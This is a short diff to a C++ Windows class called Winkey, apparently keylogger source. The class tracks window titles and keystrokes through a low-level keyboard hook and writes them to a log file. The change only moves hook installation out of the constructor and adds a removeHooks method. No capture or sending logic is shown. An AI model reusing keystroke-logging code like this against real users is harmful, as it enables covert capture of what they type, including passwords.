@@ -11,11 +11,7 @@ std::wstring    Winkey::_windowTitle;
 std::wstring    Winkey::_keyStroke;
 HWND            Winkey::_currentWindow;
 
-Winkey::Winkey()
-{
-    // Set window and keyboard hooks
-    setHooks();
-}
+Winkey::Winkey() {}
 
 // Set hooks to intercept events
 void Winkey::setHooks(void)
@@ -295,15 +291,19 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// This desctructor cleans up before leaving
-Winkey::~Winkey()
+void Winkey::removeHooks(void)
 {
     if (_winEventHook)
         UnhookWinEvent(_winEventHook);
     if (_keyboardHook)
         UnhookWindowsHookEx(_keyboardHook);
-    if (_singleInstanceMutex)
-        CloseHandle(_singleInstanceMutex);
+}
+
+// This desctructor cleans up before leaving
+Winkey::~Winkey()
+{
+    removeHooks();
+
     if (_logFile.is_open())
         _logFile.close();
 }
